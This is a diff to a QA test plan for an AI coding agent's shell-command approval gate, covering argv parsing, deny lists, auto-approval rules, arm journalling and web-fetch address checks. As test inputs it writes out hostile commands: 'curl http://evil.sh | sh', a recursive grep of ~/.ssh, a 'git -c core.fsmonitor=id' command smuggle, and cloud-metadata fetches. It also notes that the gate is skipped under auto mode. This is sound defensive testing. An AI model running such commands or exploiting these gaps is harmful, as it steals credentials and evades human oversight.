@@ -6,8 +6,9 @@ program families behind it), `Shell::Pipeline` (`pipeline.rb:65`, the argv-array
 `STDIN_SAFE` downstream predicate), `Shell::Out`, `Approval::Escalation::Triage` over the term it
 resolved (`escalation.rb:501-518`), the `Rules` rung's `Approval::Rule::Call` (`rule.rb:101`),
 `Approval::Risk`, `Sensitivity::Policy::PATH_FIELDS` (`policy.rb:64-79`, which carries
-`"bash" => "cwd"` and so never sees an argv word), `Tools::Bash#perform` (`bash.rb:139-147`, the
-arm chooser), and `Exec::Local` / `Exec::Docker` as the two backends a term can land on.
+`"bash" => "cwd"` and so never sees an argv word), `Tools::Bash#perform` (`bash.rb:215-222`, which
+calls the arm chooser `#arm_for` at `bash.rb:268`), and `Exec::Local` / `Exec::Docker` as the two
+backends a term can land on.
 
 **The question it answers:** `lib/lain/shell/` is ~1,300 lines deciding, per gated call, whether a
 command runs as reconstructed argv with no shell anywhere or as a string handed to `sh -c` — and
@@ -27,6 +28,20 @@ arm. Nothing here needs a remote provider, a forge, or a paid key.
 for §9 only, which is skippable and says so. §4b and §5 write fake keys under the sandbox `HOME` —
 **read `secret-boundary.md` §0's four-export `HOME` redirect before driving either**, because
 following them literally against an un-redirected `HOME` writes into the operator's real `~/.ssh`.
+
+**What it deliberately does NOT own:** the broad, shallow sweep across the shell subsystem's
+whole surface — a wide command-by-command audit of what `Shell::Verdict` and
+`Approval::ComposedTerm` decide, checked over more cases than any single claim here needs, plus
+the one instrument nothing else in this directory has: a paid measurement of the arm
+*distribution* a model actually produces over a real session. All of that belongs to
+[`shell-terms.md`](shell-terms.md) — its §1/§4 for the wide command sweep and its §9 (the only
+metered section in either file) for the distribution. Where this document's own sections land on
+the same ground as that sweep — §6's config-table claims 1–4, §7's "no prompt" positive case,
+§9's plain docker run, §10's refusal-string table — each says so at the point it happens and
+points back rather than re-deriving it; this document's job over that same ground is the
+mechanism underneath it (the parse boundary, the `Triage` rung's own reasoning, `STDIN_SAFE`,
+the recursive-read hazard, and whether `deny` can be reached at all in production), not a second
+copy of the sweep.
 
 ---
 
@@ -81,15 +96,27 @@ printf 'alpha\nbeta\n'         > notes.txt
 Bring the cockpit up on `$T` at `accept_edits`, per `method.md`.
 
 **The arm oracle, and it is the thing that makes this whole scenario checkable.** `Tools::Bash`
-picks its arm silently (`bash.rb:139-141`: `decision.allow? ? decision.term : input.command`) and
-**journals nothing about the choice** — that dedicated record is T5/T7's work and does not exist yet
-(§8). So the belt-and-braces oracle is a command whose two arms *disagree*, and `Shell::Pipeline`'s
-class doc names exactly one such family: a **shell builtin with no binary on disk**.
+picks its arm silently — `arm_for(decision) = decision.allow? && @exec.takes_term?(decision.term)
+? :term : :string` (`bash.rb:268`). **This is not "allow always yields term"**: the backend gets a
+vote too, and `Exec::Docker#takes_term?(term) = term.size == 1` (`docker.rb:93`) means an allowed
+*pipe* under docker still lands on the string arm — §9 drives exactly that case. At the time this
+section was first written, the choice went unjournalled — the dedicated `Telemetry::ShellArm`
+record was T5/T7's still-unlanded work (§8) — so the belt-and-braces oracle below is a
+**single-stage** command whose two arms *disagree* regardless of backend, and `Shell::Pipeline`'s
+class doc names exactly one such family: a **shell builtin with no binary on disk**. T5/T7 have
+since landed and the dedicated record now exists (§8), but the oracle is kept here: it needs no
+journal read at all, and it is what §11 uses to prove the arm was chosen even in a posture that
+writes no `escalation` record.
 
-**⚠️ CORRECTED, round 15 — the arm IS observable from the outside today, and this section used to say
-it was not.** The dedicated arm record is still missing, but the **Triage rung journals the shell
-verdict**, and verdict→arm is deterministic (`bash.rb:139-141`: allow→term, anything else→string).
-`escalation.rb:538` builds the reason as `"shell verdict #{decision.name} -- …"`, so:
+**⚠️ CORRECTED, round 15 — the arm IS observable from the outside today, for an attended session,
+and this section used to say it was not observable at all.** At the time of that correction the
+dedicated arm record did not exist yet, so the oracle below reads the **Triage rung's** journalled
+shell verdict instead. That reading is **not** a full verdict→arm derivation — the Triage rung
+only ever sees the verdict, never the backend, so it cannot distinguish this section's single-stage
+oracle from a multi-stage pipe that would land on the string arm under `--exec docker` regardless
+of the verdict (§9). It is sound for exactly the single-stage commands this section uses.
+`escalation.rb:540` builds the reason as `"shell verdict #{decision.name} -- …"`, so, in the
+attended posture, over the `exit 3` oracle:
 
 ```bash
 ruby -rjson -e 'ARGF.each_line{|l| r=JSON.parse(l) rescue next
@@ -101,9 +128,17 @@ Confirmed in both directions in one round-15 session: `exit 3` journalled `shell
 produced 127 (term); `echo "hello world"` journalled
 `shell verdict abstain -- not fully understood -- node kinds …` and produced exit 0 with the quotes
 consumed (string). **So a round can answer this document's own headline question — "can a driver tell
-from the outside which arm ran?" — with YES, from the journal**, and use `exit 3` as corroboration
-rather than as the only instrument. What T5/T7 still buy is a record that names the arm *directly*
-rather than one a reader has to derive.
+from the outside which arm ran?" — with YES, for an attended session, from the journal**, and use
+`exit 3` as corroboration rather than as the only instrument. §8 states the same boundary precisely
+— this escalation-based method is inferable for attended sessions only — and §11 is where the hole
+in *this method* actually gets driven: under `/mode auto` the ladder is never consulted, so no
+`escalation` record is written at all, and this oracle's own attended-only reach is exactly what
+makes that posture's silence real for a reader relying on it. **T5 and T7 have since landed, and
+they close the underlying gap by a different route**: the dedicated `Telemetry::ShellArm` record
+(§8, driven in full at `shell-terms.md` §6) names the arm *directly* on every gated call, and —
+unlike the escalation record this oracle reads — it is written in **every** posture including
+`/mode auto`. So the arm was never truly unobservable under `auto`; only this section's own
+escalation-based derivation was.
 
 ```
 you> run: exit 3
@@ -243,12 +278,24 @@ a name-based allow of an option-directed program and it is HIGH.
 `NameError: private constant Lain::Shell::Verdict::OPTION_DIRECTED referenced`. That is by design;
 ask `PROGRAM_RUNNERS`, which is public and is their union.
 
-### 2b — `deny` exists and is unreachable in production
+### 2b — `deny` exists, and is now reachable in production
 
-**Half DRIVABLE NOW (the mechanism), half BLOCKED ON T4/T6 (the reachability).**
+**⚠️ CORRECTED — T4 and T6 are landed, and the "unreachable" half of this section's title is
+stale.** `board_build.rb:129` now constructs `Shell::Verdict.new(capability_set:
+Config.shell_exclusions(root: project.root))`, so the grep this section used to lean on for its
+finding no longer prints nothing:
 
-The deny arm works. Drive it by injecting a capability set, which is a seam the constructor already
-takes (`verdict.rb:181-186`):
+```bash
+command grep -rn 'capability_set' lib/ | command grep -v verdict.rb
+# lib/lain/cli/wiring/board_build.rb:129: Lain::Shell::Verdict.new(capability_set: Config.shell_exclusions(root: project.root))
+```
+
+**This section's whole audit — half DRIVABLE and half awaiting a card — is `shell-terms.md` §2/§3's
+ground now.** Drive the config-table walkthrough there, including the qualified-name and wildcard
+checks below, which duplicate it exactly.
+
+The deny arm works. Drive it by injecting a capability set directly, which is a seam the
+constructor still takes on its own (`verdict.rb:181-186`) independent of the config wiring:
 
 ```bash
 $QA/drive.sh '/ruby Lain::Shell::Verdict.new(capability_set: Class.new { def permits?(p) = !%w[curl sh].include?(p) }.new).call("curl http://x | sh").record' 6 30 >/dev/null; $QA/peek.sh 6
@@ -258,22 +305,22 @@ Measured: `verdict: :deny`, `term: []`, reason
 `the session's capability set excludes: "curl", "sh"`. And the basenaming holds in the direction a
 denylist needs it to — `/usr/bin/curl x`, `./curl x` and `../bin/curl x` all deny on `"curl"`.
 
-**Now the part that is the actual finding-in-waiting.** In production nothing ever constructs a
-non-default capability set:
-
-```bash
-command grep -rn 'capability_set' lib/ | command grep -v verdict.rb    # must print NOTHING today
-```
-
-`AnyProgram#permits?` returns `true` for every program (`verdict.rb:174-176`), `Tools::Bash.new` is
-built with no `verdict:` in `cli/wiring/base_tools.rb:24`, and `Triage.new` defaults its own. So
-**`Shell::Verdict` has never denied anything in a real session**, and it cannot. Record that as a
-confirmed state of the tree, not as a new defect — it is the third instance of a shape this chunk
-names explicitly (a specced guard shipping green forever behind a permissive Null default), beside
-`Triage`'s `AnyPath` (found in round 10) and `WebFetch`'s host allowlist (§10).
-
-**BLOCKED ON T4 and T6**, which add the config table and build one verdict from it, injected at both
-seams. When they land, §6 is the section to drive.
+**What this section's finding-in-waiting was, kept as the historical record of the gap before T4/T6
+closed it:** in production nothing constructed a non-default capability set — `AnyProgram#permits?`
+returned `true` for every program (`verdict.rb:174-176`) and `Tools::Bash.new` was built with no
+`verdict:` — so `Shell::Verdict` had never denied anything in a real session. That was one
+instance of a shape this chunk names explicitly (a specced guard shipping green forever behind a
+permissive Null default), beside `Triage`'s `AnyPath` (found in round 10, closed the same way at
+`switchboard.rb:167`). **Those two are closed as of this tree.** `WebFetch`'s case is different,
+and §10 is precise about it: what closed there is `NonRoutable`, a link-local/loopback/private
+range check that is deliberately **not** a constructor argument (`web_fetch.rb:53-58` argues
+against a third injectable seam) — it runs unconditionally, with nothing to revert. The
+**allowlist** — the optional, narrower, domain-based restriction — is a genuinely different knob,
+still uninjected today (`base_tools.rb:82` builds `WebFetch.new` with no argument, and
+`allowlist_problem` still returns `nil` for a `nil` allowlist). That was never the vulnerability
+this trio tracks and finding it unset is not a regression; if a future round finds either
+`Verdict`'s `capability_set` or `Triage`'s `sensitivity:` reverted to its Null default, that is
+the regression the first two sections exist to catch.
 
 ## 3 — Which arm ran, through the real tool
 
@@ -381,7 +428,7 @@ concerns and one of them silently bounds the other.
 
 ## 5 — The recursive-read hazard: every word ordinary, the read set not
 
-**DRIVABLE NOW as a demonstration. The rule that must refuse it is BLOCKED ON T9.**
+**DRIVABLE NOW, in full — T9 has landed.**
 
 This is the limit the chunk's Intent names in its own words, and it is the reason a term-shaped
 approval rule is not simply "approve when nothing classifies protected".
@@ -399,20 +446,35 @@ inside it and not the directory. And `Shell::Verdict.new.call("grep -r . <H>/.ss
 
 So: **a term whose every word is ordinary, printing a file nothing may lift.**
 
-**What saves it today is the thing T9 removes.** The `Triage` rung abstains
-(`an allow claims the command is literal and fully understood, never that it is safe`), the call
-reaches a human, and the human reads `grep -r . /home/…/.ssh` and says no. Drive that once at
-`accept_edits` and confirm you are asked:
+**What saved it before T9, and still catches it as a second line today:** the `Triage` rung
+abstains (`an allow claims the command is literal and fully understood, never that it is safe`),
+the call reaches a human, and the human reads `grep -r . /home/…/.ssh` and says no. Drive that
+once at `accept_edits` and confirm you are asked, if driving this posture on its own:
 
 ```
 you> run: grep -r . <H>/.ssh
 ```
 
-**BLOCKED ON T9.** When the auto-approving rule lands, this exact command is its acceptance test in
-the negative: the rule must **refuse to approve it**, and it must refuse because `grep -r` is a
-*recursive reader* — a program whose read set is not its argv — and not because some word classified
-non-ordinary, since none does. A round that finds this command auto-approved has found the chunk's
-own stated blocker shipped, and that is HIGH regardless of what any spec says.
+**⚠️ CORRECTED — T9 is landed, as `Approval::ComposedTerm`, and this negative holds — but not for
+the spelling above.** `<H>/.ssh` here is the **absolute** path (`$HOME` substituted), and that is
+the spelling that matters: `shell-terms.md` §4 measures exactly `grep -h -r . /home/YOU/.ssh` as
+an abstention, refused specifically by the flag matcher over `grep`'s listed disqualifying flags
+(`--recursive` among them, `composed_term.rb:266-268`) — drive it there rather than re-deriving it
+here. **A literal `~/.ssh` spelling tests something else entirely and would not exercise
+`ComposedTerm`'s flag matcher at all**: `composed_term.rb:76-78` says so on the class itself —
+that spelling abstains *earlier, at the parser*, because a leading `~` expands
+(`Verdict::EXPANDING`), "the parser's accident and not a second guard." `shell-terms.md`'s own §1
+makes the same point about the two spellings for a different command. **Read the mechanism
+precisely before calling this closed, though**, because even the absolute spelling's refusal is
+narrower than "the rule knows about the read-set hazard": `ComposedTerm` refuses `grep -r` because
+`-r`/`--recursive` is on the disqualifying-flags list for the `grep` entry specifically
+(`composed_term.rb:241` opens `PROGRAMS`, `#decide` at `:306`, `#approvable?` at `:326`), not
+because it reasons about a program's read set being wider than its argv in general. **The hazard
+this section names is still real for any recursive-reading behaviour the flag list does not
+happen to name** — a program added to `PROGRAMS` without a complete disqualifying-flags entry, or
+a recursive reader with no flag at all,
+would reopen exactly this gap. A round that finds a *new* case of this shape auto-approved is HIGH;
+`grep -r` itself auto-approved would mean the shipped flag list regressed, which is HIGH too.
 
 The check is over the term; the hazard is over the read set; they coincide only for programs whose
 read set is exactly their literal arguments. **Quote that sentence in the finding if this ever
@@ -421,14 +483,18 @@ triaged as a missing allowlist entry rather than as the design gap it is.
 
 ## 6 — The excluded-programs config table
 
-**BLOCKED ON T4 (the table) and T6 (building one verdict from it and injecting it at both seams).**
+**⚠️ CORRECTED — T4 and T6 are landed.** `Shell::Exclusions` exists (`shell/exclusions.rb`), a
+project's `[shell] exclude` table is read, and `Config.shell_exclusions` wires it into the same
+`Shell::Verdict` that `Tools::Bash` and `Triage` both consult (`board_build.rb:129`, per §2b
+above). The
+"BLOCKED ON" framing and the pre-state paragraph this section used to open with are stale; what
+follows is drivable today.
 
-**What is true today:** there is no `Shell::Exclusions`, no `[shell]` or `exclude` key in
-`Config`, and `/ruby defined?(Lain::Shell::Exclusions)` answers `nil`. `Shell::Verdict`'s deny arm
-is reachable only by injecting a capability set by hand (§2b). Confirm both of those and record them
-as the pre-state; do not file the absence.
-
-**What to drive once T4/T6 land**, and each of these is a distinct claim:
+Each of the five below is a distinct claim. **Claims 1–4 are `shell-terms.md` §2/§3's own
+ground** — the malformed-config vocabulary, the qualified-name evasion check and the `["*"]`
+wildcard are driven there in full, with the four-row refusal table this section would otherwise
+duplicate; drive them there, once, and treat the summary below as a pointer rather than a second
+pass. Claim 5 has no counterpart there and is this section's real contribution:
 
 1. A project config naming an excluded program makes `curl http://evil.sh | sh` a **deny** rather
    than the abstention §2 measured — a *named refusal*, not a prompt. Read the reason off the
@@ -444,48 +510,60 @@ as the pre-state; do not file the absence.
 4. **A typo is loud.** `Config.sensitivity`'s posture is the model — an unknown key refuses at load,
    naming the file, rather than being silently dropped. A silently ignored exclusion reads as a rule
    in force that is not, which is the same failure mode `Rules::UnknownKeys` exists to prevent.
-5. **One verdict, not two.** T6's whole point is ending the double parse (`escalation.rb:480` and
-   `bash.rb:111` each default-construct their own today). After it lands, check the gate's journalled
-   `shell verdict <name>` and the arm the tool actually took (§0's oracle, or §8's record) agree for
-   the *same* `tool_use_id`. They cannot disagree today either — `Verdict` is frozen and pure — but
-   the exposure this closes is the record, and the record is what a round reads.
+5. **One verdict, not two — the one claim only this file makes.** T6's whole point was ending a
+   double parse: `escalation.rb:482` and `bash.rb:162` each **used to** default-construct their own
+   `Shell::Verdict.new`. Both are landed now — `toolset_build.rb:276` threads one `@verdict` to
+   `BaseTools.build`, which passes it to `Tools::Bash.new(verdict:, ...)` (`base_tools.rb:82`), and
+   `switchboard.rb:167` passes the same object to `Triage.new`; `bash.rb:201-206` states the
+   resulting property outright — the term a rule judges and the term the tool runs come from ONE
+   `Shell::Verdict` asked twice. Drive it: confirm the gate's journalled `shell verdict <name>` and
+   the arm the tool actually took (§0's oracle, or §8's record) agree for the *same* `tool_use_id`.
+   They cannot disagree even in principle — `Verdict` is frozen and pure — but the exposure T6
+   closed is that both readers now provably consult the *same* instance rather than two that happen
+   to agree, and the record is what a round reads to confirm it.
 
 ## 7 — The rule that approves a fully-allowlisted term
 
-**BLOCKED ON T8 (a `Rule::Call` that carries a term) and T9 (the rule itself).**
-
-**What is true today, and it is worth confirming by hand rather than believing:**
+**⚠️ CORRECTED — T8 and T9 are BOTH landed.** `chunk-shell-term-approval.md:1014` is *"T8 — A
+rule's `Call` carries a term it cannot be given"*, and that chunk is `status: done`. `Rule::Call`
+still has only two `Data` members:
 
 ```bash
 $QA/drive.sh '/ruby Lain::Approval::Rule::Call.members' 6 30 >/dev/null; $QA/peek.sh 6
 ```
 
-Answers `[:tool, :input]` — **no term**. `Call.for(tool:, input:)` builds from `effect.input`, so
-the `Rules` rung matches on the model's raw string. `Approval::Rule`'s own class comment
-(`rule.rb:28-50`) names the hazard: a hand-written prefix rule `command.start_with?("git ")` would
-allow `git -c core.fsmonitor=id status`, which executes `id`. **Nothing shipped is exploitable** —
-`Remembered` matches an exact call shape, not a prefix — so this is a doctrine that is unenforced,
-not a hole. Say it that way.
+Answers `[:tool, :input]` — **true, but it does not mean "no term."** `Call#term` is a derived
+method, not a `Data` member (`rule.rb:236`: `def term = parsed.term`), and `rule.rb:223-232`
+explains why in words: a third `Data` member would change `Remembered::Entry.for_call`'s key, so
+the term is computed from `input` on every ask instead. `Approval::ComposedTerm` reads exactly
+that method — `composed_term.rb:312-315` calls `call.term?` then `call.term` directly, and
+`composed_term.rb:8-10` says so on the class itself: *"It reads the PARSED TERM ... the door
+`Rule::Call#term` opened."* So `ComposedTerm` does not build a second, parallel term from the raw
+`command` string — it reads the one `Rule::Call` already derives. The consequence this section
+used to observe — "you are asked, every time, for `cat README.md | head -20`" — **no longer
+holds**: that command now auto-approves with no prompt via exactly this path; drive it at
+`shell-terms.md` §5, not here.
 
-And the consequence a driver can observe right now, at `accept_edits`:
+`Approval::Rule`'s own class comment (`rule.rb:28-50`) still names a real, separate hazard: a
+hand-written prefix rule `command.start_with?("git ")` would allow `git -c core.fsmonitor=id
+status`, which executes `id`. **Nothing shipped is exploitable that way** — `Remembered` matches
+an exact call shape, not a prefix, and `ComposedTerm` is not a prefix rule — so that doctrine gap
+about *hypothetical* rules is still real and unenforced by any general mechanism, independent of
+`ComposedTerm` having landed. What stays true from the paragraph this replaces: `Triage::Command
+#judge` still routes an allow to `#literal`, which still only `deny`s/`abstain`s on its own —
+`Ruling.allow` at the `rules` rung is `ComposedTerm`'s doing specifically, not a general
+capability every rule has, since no rule *but* `ComposedTerm` reads a term.
 
-```
-you> run: cat README.md | head -20
-```
+**What to drive, now that T9 has landed:**
 
-**You are asked. Every time.** `Triage::Command#judge` routes an allow to `#literal`, which returns
-`Ruling.deny` or `Ruling.abstain` and nothing else — its terminal constant is literally named
-`NOT_SAFE`. `Ruling.allow` exists at exactly two sites in the ladder: a rule allowed, and a human
-approved. **So the term arm decides which arm executes, never whether a human is asked**, and that
-is the whole thing this chunk exists to change.
-
-**What to drive once T9 lands:**
-
-- **The positive:** `cat README.md | head -20` and `grep -n foo lib | wc -l` run with **no prompt**,
-  and the journal shows a `rules` rung `allow` — not a `surfaces` line, and not a triage abstention
-  followed by a silent approval. `/approve` afterwards must answer `no pending approvals`.
-- **The negative controls, which matter more.** Each must still reach a human, and for its own
-  stated reason:
+- **The positive is `shell-terms.md` §5's headline claim** — `cat README.md | head -20` running
+  with no prompt and the journal showing a `rules` rung `allow` is driven there, over the real
+  local model, with the negative `dunstctl` check `shell-terms.md` §5 adds beside it. Do not
+  redrive it here; `/approve` answering `no pending approvals` afterward is the one addition
+  worth confirming if this section is driven standalone.
+- **The negative controls, which matter more, are this section's own** — each ties to a design
+  reason named elsewhere in *this* document rather than to a general allowlist audit, and none of
+  them is `shell-terms.md`'s ground. Each must still reach a human, and for its own stated reason:
 
   | command | must not be auto-approved because |
   |---|---|
@@ -510,40 +588,39 @@ is the whole thing this chunk exists to change.
 
 ## 8 — The journal record naming the arm
 
-**BLOCKED ON T5 (the record) and T7 (the bash tool writing it).**
-
-**What is true today:** `Tools::Bash` journals nothing. It holds `invocation.channel` for output
-sinks only; the eight tools that do journal take an injected journal at construction, and `Bash` is
-not one of them. `ls lib/lain/telemetry/` shows no shell or arm record. Confirm both:
-
-```bash
-ls lib/lain/telemetry/ | command grep -i -E 'shell|arm|verdict'   # nothing today
-command grep -n 'journal' lib/lain/tools/bash.rb                  # nothing today
-```
-
-What *is* journalled is the **gate's** view: `Escalation` writes one record per rung consulted,
-`"type" => "escalation"`, carrying `tool`, `tool_use_id`, `verdict`, `rung`, `reason`, `faulted`,
-`authority`. The Triage rung's reason begins `shell verdict allow` / `shell verdict abstain`
-(`escalation.rb:535-538`), so **the arm is inferable from the gate's record today, for attended
-sessions only**. Drive that now and record it as the pre-state:
+**⚠️ CORRECTED — T5 and T7 are landed** (`chunk-shell-term-approval.md` is `status: done`), which
+this section's own text did not yet reflect. `Telemetry::ShellArm` exists
+(`telemetry/shell_arm.rb`) and `Tools::Bash` journals one on **every** gated call, in both arms,
+before the command runs (`bash.rb:256-259`). Confirm both, in place of the "nothing today" this
+section used to expect:
 
 ```bash
-ruby -rjson -e 'ARGF.each_line{|l| r=JSON.parse(l) rescue next;
-  puts "#{r["rung"]}\t#{r["verdict"]}\t#{r["reason"]}" if r["type"]=="escalation"}' "$JOURNAL"
+ls lib/lain/telemetry/ | command grep -i -E 'shell|arm|verdict'   # shell_arm.rb
+command grep -n 'journal' lib/lain/tools/bash.rb                  # journal_arm and its call site
 ```
 
-**And note the hole precisely, because it is what T5/T7 are for:** under `/mode auto` the ladder is
-never consulted, so **no `escalation` record is written at all** — the experiment record is blind to
-arm selection in exactly the posture an unattended bench run uses. §11 drives that.
-
-**What to drive once T5/T7 land:** the arm record appears in **both** postures, for the same
-`tool_use_id`, and it agrees with §0's oracle. A record present at `accept_edits` and absent under
-`auto` is the same blindness with a new name.
+**This is `shell-terms.md` §6's ground in full** — the record's six fields, driving it twice
+(once attended, once under `/mode auto`) and confirming it is present in **both**, is driven
+there; do not redrive it here. What is worth keeping in this section is the boundary between the
+dedicated record and the older, indirect method the rest of this document (§0) still leans on:
+`Escalation` separately writes one record per rung consulted, `"type" => "escalation"`, and the
+Triage rung's reason begins `shell verdict allow` / `shell verdict abstain`
+(`escalation.rb:540`) — so **the arm is *also* inferable from the gate's record, for attended
+sessions only**, which is what §0 uses as its corroborating oracle. That escalation-based method
+has the hole `shell-terms.md` §6 names: under `/mode auto` the ladder is never consulted, so no
+`escalation` record is written at all, though the `shell_arm` record still is. §11 drives that
+gap for the escalation record specifically; the dedicated `shell_arm` record does not have it.
 
 ## 9 — A pipeline under `--exec docker`
 
-**Partly DRIVABLE NOW; the fix is BLOCKED ON T3.** Skip the whole section if `docker` is not on
-`PATH` and say you skipped it.
+**Partly DRIVABLE NOW; the fix was BLOCKED ON T3, which is now landed** (`chunk-shell-term-approval.md`
+is `status: done`). What follows was written and measured *before* that landing — keep it as the
+pre-state record, but **the current tree's live behaviour is `shell-terms.md` §7's ground**: an
+allowed pipe under docker now falls back to the model's string and its `shell_arm` record reads
+`"verdict":"allow","arm":"string"`. Drive the live check there; treat this section as the
+historical record of what the pre-landing exception looked like, kept because it is what tells a
+future reader the fallback was a deliberate substitution and not a shell reappearing by accident.
+Skip the whole section if `docker` is not on `PATH` and say you skipped it.
 
 Bring a session up with `--exec docker` per `subagents-and-backends.md` §4, then:
 
@@ -552,51 +629,62 @@ you> run: cat README.md
 you> run: cat README.md | head -2
 ```
 
-**Today, measured from the code:** a **single-stage** term runs — `Exec::Docker#entrypoint` takes
-`term.first` (`docker.rb:152`) and there is a spec pinning it. A **piped** term raises
-`Exec::Docker::Unsupported` (`docker.rb:158-161`), which is caught by the blanket
-`rescue StandardError` in `Effect::Handler::Live` and reaches the model as a `tool_result` with
+**Pre-state, measured from the code before T3 landed:** a **single-stage** term ran —
+`Exec::Docker#entrypoint` takes `term.first` (`docker.rb:152`) and there is a spec pinning it. A
+**piped** term raised `Exec::Docker::Unsupported` (`docker.rb:158-161`), caught by the blanket
+`rescue StandardError` in `Effect::Handler::Live` and reaching the model as a `tool_result` with
 `is_error: true` carrying the exception's own message and no class prefix:
 
 ```
 docker run takes one argv and a pipe needs a shell, so this backend has no shape for a 2-stage term: [["cat", "README.md"], ["head", "-2"]]
 ```
 
-**That is the current, correct-by-design behaviour, not a defect** — record the exact string, since
-T3's whole job is to turn that rescue into a predicate the chooser asks first.
+**That was the pre-landing, correct-by-design behaviour, not a defect** — kept as the record of
+the exact string T3's fix replaced.
 
-**What wrong looks like:** the pipe *working* under docker today. That would mean something joined
-the term back into a string and handed it to a shell, which is exactly the property the term path
-exists to protect and `docker.rb:154-156` refuses to do.
-
-**What to drive once T3 lands:** the piped call succeeds, **and** the round records that it
-succeeded by **falling back to the model's string**, which `Docker#entrypoint` runs as
-`["sh", "-c", command]` *inside* the container. Contained, but the no-shell property is gone on that
-path. A round that reports "pipelines work under docker now" without that sentence has recorded a
-capability and hidden a rung.
+**What wrong looks like today:** the pipe *raising* under docker, or the pipe running by literally
+handing the joined string to a shell rather than falling back through `Docker#entrypoint`'s own
+`["sh", "-c", command]` path — either would mean the fix regressed or the no-shell property broke
+in a new way. **What to drive now, at `shell-terms.md` §7:** the piped call succeeds, **and** the
+round records that it succeeded by **falling back to the model's string** run *inside* the
+container. Contained, but the no-shell property is gone on that path. A round that reports
+"pipelines work under docker now" without that sentence has recorded a capability and hidden a
+rung.
 
 ## 10 — `web_fetch` and the destinations no agent should reach
 
-**BLOCKED ON T11. Zero model calls to establish the pre-state.**
+**Was BLOCKED ON T11; T11 is now landed** (`chunk-shell-term-approval.md` is `status: done`), so
+the address-range floor described below as a future state is today's tree. **The refusal table,
+the redirect-hop check and the "lexical on the host" limit are all `shell-terms.md` §8's ground,
+in full** — drive them there rather than here. What this section keeps that §8 does not carry is
+the audit framing, and it is a **different shape** from §2b's two, worth stating precisely rather
+than lumping together: `Verdict`'s deny arm and `Triage`'s `AnyPath` were guards that already
+existed and were closed by *wiring* a real capability set/sensitivity in place of a permissive
+default. `WebFetch`'s address-range check did not exist at all before T11 — there was no Null
+default to swap out, because there was no seam. T11 added `NonRoutable` as new, unconditional code
+with no constructor argument governing it, which is why it cannot regress to a "Null default" the
+way the other two could.
 
 ```bash
 command grep -n 'Tools::WebFetch.new' lib/lain/cli/wiring/base_tools.rb
 $QA/drive.sh '/ruby Lain::Tools::WebFetch::ALLOWED_SCHEMES' 6 30 >/dev/null; $QA/peek.sh 6
 ```
 
-`base_tools.rb` constructs `Tools::WebFetch.new` **with no argument**, and `allowlist_problem`
-returns `nil` when the allowlist is nil — "no restriction". `egress_problem` checks the **scheme**
-and the **allowlist** and nothing else: there is no address-range check anywhere in the file. So
-today `http://169.254.169.254/latest/meta-data/` is an ordinary fetch, subject only to the gate.
+**Two of these three facts are still true today; only one is history.** `base_tools.rb:82`
+**still** constructs `Tools::WebFetch.new` with no argument, and `allowlist_problem` **still**
+returns `nil` when the allowlist is `nil` — "no restriction." Neither is the gap T11 closed: the
+optional domain allowlist was never wired and isn't meant to be by default (§2b). What genuinely
+changed is `egress_problem`: it used to check only the **scheme** and the **allowlist**, with no
+address-range check anywhere in the file, so `http://169.254.169.254/latest/meta-data/` was an
+ordinary fetch subject only to the gate. Today `egress_problem` also calls `NonRoutable.problem`
+first (`web_fetch.rb:594-598`), unconditionally, with no constructor argument governing it —
+that's the third fact, and it's the one that's actually new.
 
-This is the third instance of the shape §2b names, and the chunk calls it the only **presently
-exploitable** gap it closes — which is why T11 depends on nothing and why this section belongs in
-the cheap set the moment it lands.
-
-**What to drive once T11 lands:** the cloud-metadata address, a loopback address and an RFC1918
-address each refuse **by name and before the fetch**, and a redirect **into** a blocked range is
-refused on the hop rather than followed. The redirect leg is the half that is easy to ship broken:
-stand up a local responder returning a `302` to `http://169.254.169.254/` and confirm the refusal
+**What to drive now that T11 has landed** (at `shell-terms.md` §8): the cloud-metadata address, a
+loopback address and an RFC1918 address each refuse **by name and before the fetch**, and a
+redirect **into** a blocked range is refused on the hop rather than followed. The redirect leg is
+the half that is easy to ship broken: stand up a local responder returning a `302` to
+`http://169.254.169.254/` and confirm the refusal
 names the *hop's* host. **The check is lexical on the host**, so a public name resolving into a
 blocked range is still reachable — record that as a stated limit of the rung, not as a defect.
 
@@ -621,18 +709,22 @@ Four things, then stop:
 3. **No `escalation` records for that `tool_use_id`.** Not a bypassed rung, not a rung that abstained
    — *none*. Grep the journal by the id.
 4. **The arm was still chosen.** `Tools::Bash` picks its arm from the verdict regardless of posture,
-   so §0's oracle must still read `exit status: 127`. **This is the section's actual finding:** the
-   term arm ran, the record cannot say so, and no rung was consulted to say anything either. Under
-   `auto`, arm selection is invisible in the experiment record.
+   so §0's oracle must still read `exit status: 127`. **This is no longer where the section's
+   finding lives, now that T5/T7 have landed:** the dedicated `Telemetry::ShellArm` record is
+   written here too (`shell-terms.md` §6 drives it), so a reader with that record does not need
+   §0's oracle under `auto` at all. What genuinely stays invisible is narrower — no rung was
+   consulted, and nothing in the journal says *why* the arm ran unchallenged, only that it did.
+   Grep for the `shell_arm` record on this `tool_use_id` and confirm it reads
+   `"verdict":"allow","arm":"term"` beside the missing `escalation` record from point 3.
 
 **What wrong looks like:** `exit status: 3` here. That would mean the posture changed which *arm*
 executes, which nothing is supposed to do — the ladder decides whether a human is asked, and the
 verdict decides which arm runs, and they are meant to be independent axes.
 
-**BLOCKED ON T4/T6 and T9, and this is the limit to state in any write-up:** everything the chunk
-builds inside the escalation ladder is **inert here**. The exclusion table cannot deny under `auto`,
-and the approval rule cannot approve under it, because neither rung is consulted. Do not drive §6's
-or §7's checks from this posture and conclude the feature is broken.
+**This is the limit to state in any write-up, and it holds regardless of what has landed:**
+everything the chunk builds inside the escalation ladder is **inert here**. The exclusion table
+cannot deny under `auto`, and the approval rule cannot approve under it, because neither rung is
+consulted. Do not drive §6's or §7's checks from this posture and conclude the feature is broken.
 
 Then:
 
